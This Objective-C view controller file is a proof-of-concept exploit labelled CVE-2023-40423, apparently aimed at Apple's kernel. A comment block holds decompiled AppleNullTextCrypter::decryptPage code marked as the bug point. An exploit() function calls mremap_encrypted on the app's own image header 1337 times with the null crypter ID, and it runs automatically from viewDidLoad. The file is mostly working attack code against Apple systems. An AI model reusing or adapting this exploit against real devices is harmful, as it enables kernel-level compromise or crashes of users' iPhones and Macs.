//
//  ViewController.m
//  CVE-2023-40423
//
//  Created by seo on 12/5/25.
//

#import "ViewController.h"
#import <mach-o/dyld.h>

/* bug point is here */
/*
 __int64 __fastcall AppleNullTextCrypter::decryptPage(
         AppleNullTextCrypter *this,
         void *address,
         void *a3,
         unsigned __int64 a4,
         TextCrypterSession *a5)
 {
   IOMemoryDescriptor *v7; // x21
   IOMemoryDescriptor *v8; // x22
   int v9; // w0
   int v10; // w0

   v7 = IOMemoryDescriptor::withAddress(address, 1u, 2u);
   v8 = IOMemoryDescriptor::withAddress(a3, 1u, 1u);
   v9 = ((__int64 (__fastcall *)(IOMemoryDescriptor *, _QWORD))v7->prepare)(v7, 0);
   if ( v9 )
     j__IOLog_144("AppleNullTextCrypter::decryptPage: src prep %08x", v9);
   v10 = ((__int64 (__fastcall *)(IOMemoryDescriptor *, _QWORD))v8->prepare)(v8, 0);
   if ( v10 )
     j__IOLog_144("AppleNullTextCrypter::decryptPage: dst prep %08x", v10);
   ((void (__fastcall *)(IOMemoryDescriptor *, _QWORD))v7->complete)(v7, 0);
   ((void (__fastcall *)(IOMemoryDescriptor *, _QWORD))v8->complete)(v8, 0);
   ((void (__fastcall *)(IOMemoryDescriptor *))v7->release_0)(v7);
   ((void (__fastcall *)(IOMemoryDescriptor *))v8->release_0)(v8);
   j__memcpy_107(a3, address, 1u);
   return 0;
 }
 
 */

extern int mremap_encrypted(void*, size_t, uint32_t, uint32_t, uint32_t);

void hexdump(const void* data, size_t size) {
    char ascii[17];
    size_t i, j;
    ascii[16] = '\0';
    for (i = 0; i < size; ++i) {
        if ((i % 16) == 0)
        {
            printf("[0x%016llx+0x%03zx] ", &data, i);
        }

        printf("%02X ", ((unsigned char*)data)[i]);
        if (((unsigned char*)data)[i] >= ' ' && ((unsigned char*)data)[i] <= '~') {
            ascii[i % 16] = ((unsigned char*)data)[i];
        }
        else
            ascii[i % 16] = '.';

        if ((i + 1) % 8 == 0 || i + 1 == size) {
            printf(" ");
            if ((i + 1) % 16 == 0)
                printf("|  %s \n", ascii);
            else if (i + 1 == size) {
                ascii[(i + 1) % 16] = '\0';
                if ((i + 1) % 16 <= 8) {
                    printf(" ");
                }
                for (j = (i + 1) % 16; j < 16; ++j)
                    printf("   ");

                printf("|  %s \n", ascii);
            }
        }
    }
}

int exploit(void) {
   for(int i = 0; i < 1337; i++) {
       int ret = mremap_encrypted((void*)_dyld_get_image_header(0), 0x4000, 0x10, CPU_TYPE_ARM64, CPU_SUBTYPE_ARM64_ALL);    //args: cryptbase, cryptsize, cryptid, cpuType, cpuSubType
       printf("mremap_encrypted(cryptid = com.apple.null) ret = %d, errno = %d\n", ret, errno);
   }
    return 0;
}

@interface ViewController ()

@end

@implementation ViewController

- (void)viewDidLoad {
    [super viewDidLoad];
    // Do any additional setup after loading the view.
    
    exploit();
}


@end
